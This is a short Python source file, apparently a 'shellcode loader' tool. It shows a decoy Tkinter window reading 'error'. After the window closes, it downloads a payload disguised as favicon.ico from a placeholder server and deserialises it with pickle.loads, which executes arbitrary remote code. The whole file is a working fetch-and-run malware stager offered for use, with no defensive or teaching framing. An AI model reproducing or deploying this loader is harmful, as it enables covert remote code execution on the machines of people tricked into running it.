# !/usr/bin/env python
# -*-coding:utf-8 -*-

"""
# File: loader.py
# Time：2022/5/27 22:43
# Author：iloveflag@outlook.com
# version：Python 3.8.0 (tags/v3.8.0:fa919fd, Oct 14 2019, 19:21:23) [MSC v.1916 32 bit (Intel)] on win32
# Github：https://github.com/iloveflag
"""

import urllib.request
from tkinter import *


class Application(Frame):
    def __init__(self, master=None):
        Frame.__init__(self, master)
        self.pack()
        self.createWidgets()

    def createWidgets(self):
        self.helloLabel = Label(self, text='error')
        self.helloLabel.pack()


app = Application()

app.master.title('https://github.com/iloveflag/PythonShellcodeLoader')
app.mainloop()

import pickle
import ctypes

shellcode = urllib.request.urlopen("http://yourserver/favicon.ico").read()
pickle.loads(shellcode)
